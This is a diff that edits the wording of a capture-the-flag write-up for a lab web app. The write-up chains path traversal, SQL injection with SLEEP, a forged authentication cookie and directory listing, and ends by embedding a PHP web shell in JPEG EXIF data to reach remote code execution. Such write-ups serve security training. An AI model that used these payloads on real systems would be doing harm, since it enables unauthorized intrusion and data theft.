@@ -1,5 +1,5 @@
 ![[Screenshot 2024-07-06 alle 16.26.55.png]]
-Upon browsing our VulnLab instance we immediately notice request to `/thumbnail?file=bg2.jpg`. The first thing that come to mind is path traversal. In fact if we request `/etc/passwd` with a classic payload we get an error message:
+Upon browsing our VulnLab instance we immediately notice a request to `/thumbnail?file=bg2.jpg`. The first thing that comes to mind is of course path traversal. In fact if we request `/etc/passwd` with a classic payload we get an error message:
 
 ```
 GET /thumbnail?file=../../../../../../../etc/passwd HTTP/1.1
@@ -7,7 +7,7 @@ GET /thumbnail?file=../../../../../../../etc/passwd HTTP/1.1
 Reading content from this directory is denied
 ```
 
-in particular if we compare to 
+which is different from say this one:
 
 ```
 GET /thumbnail?file=../../../../../../../tmp/foobar HTTP/1.1
@@ -15,13 +15,13 @@ GET /thumbnail?file=../../../../../../../tmp/foobar HTTP/1.1
 File doesn't exist
 ```
 
-We keep this info in mind for the moment. The second thing that stands out are request to an `/analytics` endpoint:
+We keep this information in mind for the moment: it will be useful later. The second thing that stands out are requests to an `/analytics` endpoint:
 
 ```
 GET /analytics?page=/news/1 HTTP/1.1
 ```
 
-It's easy to see that /analytics endpoint is vulnerable to SQL injection and to dump the db where we find a users table:
+It's easy to see that `/analytics`  is vulnerable to SQL injection so we can dump the db where we find a users table:
 
 ```
 Database: vulnlab
@@ -34,12 +34,13 @@ Table: user
 +----+----------------------------------+-----------+
 ```
 
-The hash did not crack at least for me but at least  we have a valid username that we can use to try bruteforcing login form:
+The hash did not crack - at least for me - but now we have a valid username  we can use and try bruteforcing the login form:
+
 ![[Screenshot 2024-07-06 alle 16.37.24.png]]
 
-Finding a valid password is of course left as an exercise to the reader, but like in any Adam challenge, when bruteforce is involved you can just use  wordlists suggested on HackingHub.io.
+Finding a valid password is of course left as an exercise to the reader, but like in any Adam's challenge, when bruteforce is involved you can just use  wordlists suggested on HackingHub.io.
 
-We now have a  new endpoint `/account/files` that lists our users medical results:
+We now have a  new endpoint `/account/files` that lists our user's medical results:
 
 ![[Screenshot 2024-07-06 alle 16.41.12.png]]
 
@@ -51,7 +52,7 @@ GET /account/files HTTP/1.1
 
 Here we notice that we have "files" list where bob.jones, our username, is somehow involved in the path.
 
-Upon logging in we have a strange cookie that contains some useful information:
+More importantly, upon logging in we have a strange cookie that contains some useful information:
 
 ```
 Cookie: token=eyJkYXRhIjoiZXlKcFpDSTZNaXdpZFhObGNtNWhiV1VpT2lKaWIySXVhbTl1WlhNaWZRPT0iLCJhdXRoIjoiNmI3ZjZjYzI0NjhjNzBhN2U5N2I0MjM3ZGEyMDBmY2YifQ%3D%3D
@@ -77,6 +78,8 @@ This part can be tricky: the auth hash authenticates the information inside the 
 {"data":"eyJpZCI6MiwidXNlcm5hbWUiOiJib2Iuam9uZXMifQ==","auth":true}
 ```
 
+	Notice  that here we are using a "counterfit" token: 
+
 ```
 GET /account/files HTTP/1.1
 Cookie: token=eyJkYXRhIjoiZXlKcFpDSTZNaXdpZFhObGNtNWhiV1VpT2lKaWIySXVhbTl1WlhNaWZRPT0iLCJhdXRoIjp0cnVlfQ%3d%3d
@@ -85,7 +88,7 @@ Cookie: token=eyJkYXRhIjoiZXlKcFpDSTZNaXdpZFhObGNtNWhiV1VpT2lKaWIySXVhbTl1WlhNaW
 ```
 
 This not only works without giving errors, but it allows us to alter the inner content of the data attribute.
-So, using one of my favourite burp extension which is called Hackvector, we can use something like this
+Using a very handy burp extension which is called Hackvector (or of course constructing payloads manually) we can use something like this:
 
 ```
 GET /account/files HTTP/1.1
@@ -109,13 +112,13 @@ Interestingly enough we have a way to list directories.
 
 For flag number 2 it's enough to list `../` to find a secret file.
 
-But now what? Remember that at this point we have three things that we have to put together to reach a much better result (RCE in the end)
+But now what? Remember that at this point we have three things that we have to put together to reach a much better result (RCE in the end):
 
-1. a SQL injection on `/analytics?page=/news/1`
-2. the possibility to list directories, and in particular `/tmp`
-3. maybe (we are not sure yet), the possibility to include files from `/tmp` directory via `/thumbnail?file=../../../../../../../tmp/foobar`
+1. a SQL injection on `/analytics?page=/news/1`;
+2. the possibility to list directories, and in particular `/tmp`;
+3. maybe (we are not sure yet), the possibility to include files from `/tmp` directory via `/thumbnail?file=../../../../../../../tmp/foobar`.
  
-Are we able to upload files to /tmp? Sure:   during file upload PHP, the language of choice by Adam, creates temporary files under /tmp. Files have a random name, so it will be hard to list /tmp/ with the second vulnerability unless we can also let the server SLEEP during upload using the SQL injection. So we can try something like this:
+Are we able to upload files to /tmp? Sure:  during file upload PHP, the language of choice by Adam, creates temporary files under /tmp. Files have a random name, so it will be hard to list /tmp/ with the second vulnerability unless we can also let the server SLEEP during upload using the SQL injection. So we can try something like this:
 
 
 ```
@@ -159,7 +162,7 @@ Content-Length: 22
 Not a valid image file
 ```
 
-we need to overcome the last defense with a real image containing actual php code.
+we need to overcome the last defense with a real image that also contains actual php code.
 
 Please note that a valid jpg image is necessary because, as you will see once you have a shell, there is this restriction in place:
 
@@ -172,7 +175,7 @@ if (@exif_imagetype($file)) {
 }
 ```
 
-I order to facilitate the process I created a simple form on my machine to do the POST:
+I order to facilitate the process we can create a very  simple form on our machine to do the POST:
 
 ```html
 <form method="post" enctype="multipart/form-data" action="https://xyz.eu1.ctfio.com/analytics?page=a';SELECT SLEEP(300)-- -">
@@ -181,7 +184,7 @@ I order to facilitate the process I created a simple form on my machine to do th
         </form>
 ```
 
-and before uploading a real jpg I inserted a php payload with exiftool:
+and before uploading a real jpg we can insert in it  a PHP payload with exiftool:
 
 ```bash
 exiftool  -author='<?php system($_GET["cmd"]); ?>' test.jpg
